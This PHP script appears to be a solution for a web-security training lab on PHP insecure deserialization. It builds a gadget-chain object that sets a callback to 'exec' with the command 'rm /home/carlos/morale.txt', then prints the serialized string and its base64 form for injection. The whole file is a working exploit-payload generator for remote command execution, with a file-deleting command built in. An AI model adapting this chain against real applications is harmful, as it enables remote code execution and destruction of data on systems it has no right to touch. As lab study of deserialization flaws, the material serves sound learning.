
<?php
// CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt" systems command 
// CustomTemplate->desc = "" Invoke Danger Sink!!
// DefaultMap->callback = "exec" 

class DefaultMap{
    public $callback;
    public function __construct()
    {    
        $this->callback = "exec";
    }
}

class CustomTemplate{
    
    public $DefaultMap;   

    public function __construct()
    {
        $this->default_desc_type = "rm /home/carlos/morale.txt";
        $this->desc = "DefaultMap";
        $this->DefaultMap = new DefaultMap();
    }
    public function appendObj(){
        $reulst = new DefaultMap();   
        return $reulst;
    }
 
}
$DefaultMapObject = new DefaultMap();
$object = new CustomTemplate();

$serializedObject = $object->appendObj();
$serialzeDefaultMapObj = serialize($serializedObject);

echo $serialzeDefaultMapObj. "\n";
echo serialize($object). "\n";

echo "------------------------------------------------"."\n";
echo "final paylaod" . "\n";
// 构建最终序列化字符串
$finalSerialized = 'O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";'. $serialzeDefaultMapObj.'}';;


echo $finalSerialized . "\n";
echo base64_encode($finalSerialized);
?>